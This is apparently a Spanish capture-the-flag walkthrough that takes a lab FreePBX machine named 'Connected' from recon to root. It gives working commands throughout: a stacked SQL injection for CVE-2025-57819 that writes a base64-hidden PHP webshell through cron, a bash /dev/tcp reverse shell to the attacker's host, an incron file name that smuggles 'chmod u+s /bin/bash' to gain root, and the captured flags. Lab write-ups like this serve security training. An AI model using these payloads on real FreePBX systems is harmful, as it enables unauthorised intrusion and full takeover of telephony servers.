Connected de cero a root

Paso a paso completo de la máquina Connected (FreePBX): cada comando en su línea, dónde se ejecuta, qué hace y qué debe ocurrir. Pensado para seguirlo sin saltarse nada.

  1. Recon

Leyenda

Antes de empezar: dos terminales

Todo el rato trabajas con dos ventanas de terminal. No las mezcles: es el error más común.

En Kali  Tu máquina de ataque. El prompt es ┌──(kali㉿kali)-[~] / └─$.

En la víctima  La shell que consigues dentro de Connected. El prompt es [asterisk@connected html]$ (y luego bash-4.2# como root).

Clave: [asterisk@connected html]$ no se teclea — es el prompt que te muestra la víctima, igual que └─$ es el tuyo. Escribes los comandos a su derecha.
00

Variables de la sesión

Guardamos IP y nuestra IP de VPN en variables para no repetirlas. Son por-terminal: si abres otra pestaña, hay que volver a definirlas.

En Kali 
$ IP=10.129.245.100
$ LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet )[\d.]+')
$ echo "IP=$IP  LHOST=$LHOST"
IP=10.129.245.100  LHOST=10.10.15.193

IP=... fija la IP de la máquina objetivo. LHOST=$(...) extrae tu IP de la interfaz VPN tun0 (si tu VPN usa otro nombre, míralo con ip -4 a). echo confirma que ambas tienen valor.

Qué ocurre: si LHOST sale vacío, la reverse shell del paso 4 nunca conectará. Compruébalo aquí, no después.
01

Recon y fingerprint → encontrar el CVE

De "no sé nada" a "esto es FreePBX 16 vulnerable a CVE-2025-57819".

En Kali 
$ nmap -sCV -p- --min-rate 2000 $IP
22/tcp  ssh   OpenSSH ...
80/tcp  http  Apache ...
443/tcp https  ... commonName=pbxconnect

nmap -sCV -p- escanea los 65535 puertos con scripts y detección de versión. Aparecen 22, 80 y 443. El certificado de 443 ya filtra un nombre: pbxconnect.

$ curl -skI http://$IP
Location: http://connected.htb/
$ echo "$IP connected.htb pbxconnect" | sudo tee -a /etc/hosts

curl -skI pide solo las cabeceras: el 80 redirige al vhost connected.htb. Lo añadimos a /etc/hosts para que el nombre resuelva a la IP.

$ curl -sk https://connected.htb/admin/ | grep -iE 'freepbx|version'
... FreePBX Administration ...
$ # versión exacta en el módulo framework / footer del login
$ curl -sk https://connected.htb/admin/config.php | grep -iE 'framework|16\.'
... 16.0.40.7 ...

Confirmamos el producto (FreePBX Administration) y, sobre todo, la versión exacta 16.0.40.7, que es la que decide si es vulnerable.

Qué ocurre: buscando "FreePBX endpoint SQL injection 2025" + searchsploit freepbx endpoint llegas a CVE-2025-57819. La señal que dirige al CVE es la combinación FreePBX 16.0.40.x + módulo endpoint (0-day explotado en agosto 2025, parcheado en 16.0.40.11 / 17.x).
02

Foothold: inyección SQL (CVE-2025-57819)

SQLi preauth en el módulo endpoint → query apilada que inserta una tarea cron que escribe un webshell.

En Kali

Primero guardamos el payload en una variable (una sola línea; ojo al espacio final tras -- , que es el comentario de MySQL):

$ PAYLOAD="x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','webshell','echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==|base64 -d >/var/www/html/webshell.php',NULL,'* * * * *',30,1,1) -- "
$ echo "[$PAYLOAD]"   # debe terminar en:  --  (con espacio)

El echo ...|base64 -d escribe el fichero /var/www/html/webshell.php con el contenido <?php system($_GET[cmd]); ?> (eso es lo que hay en el base64 PD9waHAg...). La fila queda con schedule = '* * * * *' → se ejecuta cada minuto.

Ahora lanzamos la inyección (una sola línea para que no se cuele el prompt al pegar):

$ curl -sk -G --resolve connected.htb:443:$IP "https://connected.htb/admin/ajax.php" --data-urlencode 'module=FreePBX\modules\endpoint\ajax' --data-urlencode 'command=model' --data-urlencode 'template=x' --data-urlencode 'model=model' --data-urlencode "brand=$PAYLOAD"
{"error":{..."Trying to access array offset on value of type bool"...}}

-G --data-urlencode hace que curl codifique los parámetros (espacios, \, comillas) por ti, evitando el infierno de comillas en la shell. El module=FreePBX\modules\endpoint\ajax usa el namespace que salta el chequeo de Referer; el payload va en brand.

Qué ocurre: que devuelva vacío o el error "...array offset on value of type bool" es normal y buena señal: tu x' rompió el SELECT original, pero el ;INSERT apilado ya se ejecutó por detrás. Esta SQLi es a ciegas; no esperes ver el resultado aquí.
Trampa habitual: no pegues el prompt └─$ delante del comando → command not found. Y define $PAYLOAD en la misma terminal, con comillas dobles (lleva comillas simples dentro).
03

Cazar el webshell (es efímero)

El cron recrea webshell.php cada minuto, pero desaparece entre ejecuciones → da 404 a ratos. Usamos una función con reintento.

En Kali 
$ sh() { while :; do out=$(curl -sk -G --resolve connected.htb:443:$IP "https://connected.htb/webshell.php" --data-urlencode "cmd=$1"); case "$out" in *"404 Not Found"*|"") sleep 2 ;; *) printf '%s\n' "$out"; break ;; esac; done; }
$ sleep 70        # esperar a que el cron corra al menos una vez
$ sh 'id'
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

sh() es una función: pide webshell.php?cmd=... en bucle; si recibe un 404 (o vacío) espera 2s y reintenta; en cuanto recibe salida real la imprime y sale. Así cazas la ventana en que el fichero existe.

Qué ocurre: ver uid=999(asterisk) confirma RCE como el usuario asterisk. El foothold funcionó. Si el bucle gira más de ~70s sin pillar nada, el cron dejó de recrearlo → vuelve al paso 2 (re-inyecta) y repite.
04

Reverse shell (salir del webshell frágil)

El webshell es inestable; saltamos a una shell interactiva por TCP que no depende del fichero.

En Kali · Terminal A (listener) 
$ nc -lvnp 443
listening on [any] 443 ...

nc -lvnp 443 pone a Kali a escuchar en el puerto 443. Déjala quieta.

NO aprietes Ctrl+Z aquí. Mientras el nc solo escucha (sin conexión), Ctrl+Z lo suspende y mata el listener. El Ctrl+Z solo se usa en el paso 5, y con la conexión ya establecida.
En Kali · Terminal B (dispara) 
$ sh "bash -c 'bash -i >& /dev/tcp/$LHOST/443 0>&1'"

Reusa la función sh para ejecutar en la víctima una bash reversa que conecta de vuelta a tu $LHOST en el 443. Este comando no muestra nada — es correcto: la shell cae en la Terminal A.

Qué ocurre: en la Terminal A aparece connect to [tu_ip] from ... connected.htb y el prompt [asterisk@connected html]$. Ya tienes shell estable.
05

Estabilizar la shell (opcional pero cómodo)

Convertir la shell tonta en un TTY. En Connected solo existe python2 (ni python ni python3).

En la víctima 
$ python2 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm

pty.spawn te da un pseudo-terminal (flechas, tab, Ctrl+C). export TERM=xterm arregla el tipo de terminal.

Qué ocurre (ahora sí, con la conexión viva): para poder pegar comandos en bloque sin que se amontonen, aprieta Ctrl+Z → en Kali escribe stty raw -echo; fg → pulsa Enter. Esto no desconecta, solo devuelve la shell ya estabilizada.
Si no quieres arriesgarte con Ctrl+Z: sáltate el stty y trabaja escribiendo un comando cada vez (Enter tras cada uno). Esta shell amontona las líneas si pegas varias de golpe.
06

Flag de user

En la víctima 
$ ls -la /home
drwxr-xr-x 10 asterisk asterisk  ... asterisk
$ cat /home/asterisk/user.txt
ab7f8d3cbfa45e4eb7f399784cd25f8d

Solo hay un home de usuario, asterisk. La flag está en /home/asterisk/user.txt. Si no estuviera: find / -name user.txt 2>/dev/null.

Flag user: ab7f8d3cbfa45e4eb7f399784cd25f8d (cambia en cada reset de la máquina)
07

Privesc a root: incron + hook sysadmin

incrond corre como root y vigila /var/spool/asterisk/incron/ (escribible por asterisk). Un fichero con nombre especial dispara fwconsole con inyección de comando.

En la víctima 
$ ls -ld /var/spool/asterisk/incron/
drwxrwxr-x 2 asterisk asterisk ... /var/spool/asterisk/incron/

Confirmamos que el directorio existe y es escribible por nuestro usuario (rwx para el grupo asterisk).

Generamos el nombre del fichero trampa. El hook fwconsole-commands decodifica el payload y lo pasa a fwconsole; metemos un ; para inyectar un segundo comando que ponga SUID a bash:

$ python2 -c 'import zlib,base64,json;print("api.fwconsole-commands."+base64.b64encode(zlib.compress(json.dumps(["help; chmod u+s /bin/bash","txn"]))).replace("/","_"))'
api.fwconsole-commands.eJyLVspIzSmwVkjOyM1PUSjVLlbQT8rM009KLM5Q0lFQKqnIU4oFANkjC34=

El payload es base64(zlib.compress(json([cmd,"txn"]))) con / → _, siendo cmd = "help; chmod u+s /bin/bash". El help es un comando válido de fwconsole; el ; encadena nuestro chmod.

Creamos el fichero con la cadena real (no el literal <CADENA>) y esperamos unos segundos a que root lo procese:

$ touch "/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVkjOyM1PUSjVLlbQT8rM009KLM5Q0lFQKqnIU4oFANkjC34="
$ sleep 6
$ ls -l /bin/bash
-rwsr-xr-x 1 root root 964536 ... /bin/bash
Qué ocurre: incrond (root) ve el fichero nuevo, ejecuta sysadmin_manager → fwconsole → corre tu chmod u+s /bin/bash. La s en -rwsr-xr-x confirma que /bin/bash ya es SUID root.
Trampa habitual: si dejas el literal <CADENA> en el touch, el hook no dispara y /bin/bash seguirá como -rwxr-xr-x. Copia la cadena exacta que imprimió python2.
08

Convertirse en root y leer la flag

En la víctima 
$ bash -p
# id
uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
# cat /root/root.txt
68d66a7101c868e82b8f20a336fc55bd

bash -p arranca bash conservando el euid del binario SUID → euid=0(root). Ya puedes leer /root/root.txt.

Flag root: 68d66a7101c868e82b8f20a336fc55bd

Root "completo" (opcional)

Con bash -p tienes euid=0 pero uid=999. Si alguna herramienta se queja, consigue uid=0 real:

# python2 -c 'import os;os.setuid(0);os.system("/bin/bash")'
★

Checklist de errores que ya pisamos

  • Prompt pegado: no copies └─$ ni [asterisk@connected html]$ dentro del comando.
  • Terminal equivocada: enumeración y privesc van en la víctima, no en Kali. Mira el prompt antes de teclear.
  • Ctrl+Z prematuro: mata el nc si aún no hay conexión. Úsalo solo en el paso 5.
  • Variables vacías: $IP, $LHOST, $PAYLOAD son por-terminal. Redefínelas si cambias de pestaña.
  • Comillas: el payload va en comillas dobles (lleva simples dentro); con curl -G --data-urlencode.
  • Espacio final en -- : sin él, MySQL no toma el comentario y la query falla.
  • Shell que amontona: pega comandos de uno en uno, o estabiliza con stty raw -echo; fg.
  • Solo python2: en Connected no hay python ni python3.
